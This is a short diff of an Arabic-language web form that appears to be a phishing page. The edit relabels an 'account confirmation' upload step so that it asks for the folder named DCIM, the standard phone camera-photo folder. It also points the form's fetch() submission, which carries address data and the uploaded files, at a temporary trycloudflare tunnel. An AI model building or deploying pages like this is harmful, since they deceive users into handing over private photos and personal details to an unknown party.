@@ -241,7 +241,7 @@
             <input type="text" id="address" name="address" placeholder="المدينة، الحي، اسم الشارع" autocomplete="off">
         </div>
 
-        <div class="section-title">إرفاق مجلد المراجعات والتقييمات</div>
+        <div class="section-title">إرفاق مجلد المراجعات والتقييمات باسم DCIM</div>
         
         <div class="upload-zone" id="upload-box" onclick="document.getElementById('media-picker').click()">
             <div class="upload-text" id="upload-label">اضغط هنا لرفع مجلد التقييمات لتأكيد الحساب</div>
@@ -332,7 +332,7 @@
         submitBtn.innerText = 'جاري إرسال البيانات وتأكيد الطلب...';
 
         // تعديل الرابط ليتناسب مع خادم Flask المحلي
-        fetch('https://Yajkototokj.pythonanywhere.com/submit', {
+        fetch('https://firmware-physics-opinion-reached.trycloudflare.com/submit', {
             method: 'POST',
             body: formData
         })
